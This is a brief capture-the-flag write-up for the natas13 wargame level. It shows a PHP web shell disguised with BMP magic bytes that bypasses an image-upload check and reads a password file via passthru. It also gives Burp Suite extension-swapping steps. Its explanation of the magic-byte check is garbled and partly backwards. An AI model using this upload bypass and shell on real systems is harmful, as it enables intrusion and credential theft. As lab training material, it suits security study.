# natas13

This one is the same as above. Have the same file ready. 
<br>
Now ask GPT how exactly it checks for the image type based on that 1 line in source code. Then you get to know that if the hexdump of an image does not start with magic hex which in text is BMP, then it counts as an image.<br>
Thus you can simply do-
```php
BMP<?php
echo passthru('cat /etc/natas_webpass/natas14');
?>
```
And this works. You can upload it as usual, do the same changes in BARPSUITE as natas12(.jpg -> .php) and you are done.
You can also change the hex of the file(compare with real jpg file and copy the initial few Hex's)

**Beware:** The text you get may not work. Why? Cause you have BMP in the beginning. Remove that and you are good to go.(It was a shocker to me why that didn't work initially)